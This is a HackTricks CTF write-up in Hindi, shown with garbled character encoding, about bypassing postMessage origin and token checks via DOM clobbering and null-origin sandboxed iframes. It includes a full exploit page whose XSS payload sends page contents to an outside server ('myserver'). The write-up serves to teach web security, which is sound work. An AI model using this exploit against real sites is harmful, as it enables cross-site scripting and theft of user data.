# рдЖрдИрдлреНрд░реЗрдореНрд╕ рдХреЗ рд╕рд╛рде SOP рдХреЛ рджреМрд░ рдХрд░рдирд╛ - 2

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SOP-2 рдореЗрдВ рдЖрдИрдлреНрд░реЗрдореНрд╕

рдЗрд╕ [**рдЪреБрдиреМрддреА**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc) рдХреЗ [**рд╕рдорд╛рдзрд╛рди**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution) рдореЗрдВ, [**@Strellic\_**](https://twitter.com/Strellic\_) рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдХреА рдПрдХ рд╕рдорд╛рди рд╡рд┐рдзрд┐ рдХрд╛ рдкреНрд░рд╕реНрддрд╛рд╡ рдХрд░рддреЗ рд╣реИрдВред рдЪрд▓реЛ рдЗрд╕реЗ рджреЗрдЦрддреЗ рд╣реИрдВред

рдЗрд╕ рдЪреБрдиреМрддреА рдореЗрдВ рд╣рдореЗрдВ рдЖрдХреНрд░рдордХ рдХреЛ рдЗрд╕реЗ **рджреМрд░ рдХрд░рдирд╛** рд╣реЛрдЧрд╛:
```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```
рдпрджрд┐ рд╡рд╣ рдРрд╕рд╛ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ HTML рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдПрдХ **postmessage** рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **`innerHTML`** рдХреЗ рд╕рд╛рде рдкреГрд╖реНрда рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛рдПрдЧрд╛ рдмрд┐рдирд╛ рд╕реНрд╡рдЪрд╛рд▓рди рдХреЗ (**XSS**).

**рдкрд╣рд▓реА рдЬрд╛рдВрдЪ** рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ **`window.calc.contentWindow`** рдХреЛ **`undefined`** рдФрд░ **`e.source`** рдХреЛ **`null`** рдмрдирд╛рдирд╛:

* **`window.calc.contentWindow`** рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **`document.getElementById("calc")`** рд╣реИред рдЖрдк **`document.getElementById`** рдХреЛ **`<img name=getElementById />`** рдХреЗ рд╕рд╛рде рдЕрдзрд┐рдЧреНрд░рд╣рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Sanitizer API -[рдпрд╣рд╛рдВ](https://wicg.github.io/sanitizer-api/#dom-clobbering)- рдЕрдкрдиреА рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдерд┐рддрд┐ рдореЗрдВ DOM clobbering рд╣рдорд▓реЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдиреНрдпрд╛рд╕рд┐рдд рдирд╣реАрдВ рд╣реИ)ред
* рдЗрд╕рд▓рд┐рдП, рдЖрдк **`document.getElementById("calc")`** рдХреЛ **`<img name=getElementById /><div id=calc></div>`** рдХреЗ рд╕рд╛рде рдЕрдзрд┐рдЧреНрд░рд╣рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдлрд┐рд░, **`window.calc`** **`undefined`** рд╣реЛ рдЬрд╛рдПрдЧрд╛ред
* рдЕрдм, рд╣рдореЗрдВ **`e.source`** рдХреЛ **`undefined`** рдпрд╛ **`null`** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдХреНрдпреЛрдВрдХрд┐ `==` рдХрд╛ рдЙрдкрдпреЛрдЧ `===` рдХреЗ рдмрдЬрд╛рдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, **`null == undefined`** **`True`** рд╣реИ)ред рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ "рдЖрд╕рд╛рди" рд╣реИред рдпрджрд┐ рдЖрдк рдПрдХ **iframe** рдмрдирд╛рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рд╕реЗ **postMessage** рднреЗрдЬрддреЗ рд╣реИрдВ рдФрд░ рддрддреНрдХрд╛рд▓ **remove** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ **`e.origin`** **`null`** рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```javascript
let iframe = document.createElement('iframe');
document.body.appendChild(iframe);
window.target = window.open("http://localhost:8080/");
await new Promise(r => setTimeout(r, 2000)); // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`);
document.body.removeChild(iframe); //e.origin === null
```
рджреВрд╕рд░реЗ рдЪреЗрдХ рдХреЛ рдЯреЛрдХрди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЫрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`token`** рдХреЗ рд╕рд╛рде рдорд╛рди `null` рднреЗрдЬрдХрд░ рдФрд░ **`window.token`** рдХреЛ рдорд╛рди **`undefined`** рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

* **`null`** рдореВрд▓ рдкреГрд╖реНрдареЛрдВ рдореЗрдВ **`document.cookie`** рдХрд╛ рдкрд╣реБрдВрдЪ рдХрд░рдиреЗ рдкрд░ рддреНрд░реБрдЯрд┐ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП **`window.token`** рдХрд╛ рдорд╛рди **`undefined`** рд╣реЛ рдЬрд╛рдПрдЧрд╛.
* **`null`** рдореВрд▓ рдкреГрд╖реНрдареЛрдВ рдореЗрдВ **`document.cookie`** рдХрд╛ рдкрд╣реБрдВрдЪ рдХрд░рдиреЗ рдкрд░ рддреНрд░реБрдЯрд┐ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП **`window.token`** рдХрд╛ рдорд╛рди **`undefined`** рд╣реЛ рдЬрд╛рдПрдЧрд╛.

[**@terjanq**](https://twitter.com/terjanq) рджреНрд╡рд╛рд░рд╛ рдЕрдВрддрд┐рдо рд╕рдорд╛рдзрд╛рди [**рдпрд╣рд╛рдВ**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html) рд╣реИ:
```html
<html>
<body>
<script>
// Abuse "expr" param to cause a HTML injection and
// clobber document.getElementById and make window.calc.contentWindow undefined
open('https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"');

function start(){
var ifr = document.createElement('iframe');
// Create a sandboxed iframe, as sandboxed iframes will have origin null
// this null origin will document.cookie trigger an error and window.token will be undefined
ifr.sandbox = 'allow-scripts allow-popups';
ifr.srcdoc = `<script>(${hack})()<\/script>`

document.body.appendChild(ifr);

function hack(){
var win = open('https://obligatory-calc.ctf.sekai.team');
setTimeout(()=>{
parent.postMessage('remove', '*');
// this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
// token=null equals to undefined and e.source will be null so null == undefined
win.postMessage({token:null, result:"<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>"}, '*');
},1000);
}

// this removes the iframe so e.source becomes null in postMessage event.
onmessage = e=> {if(e.data == 'remove') document.body.innerHTML = ''; }
}
setTimeout(start, 1000);
</script>
</body>
</html>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud)** рдХреЛ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
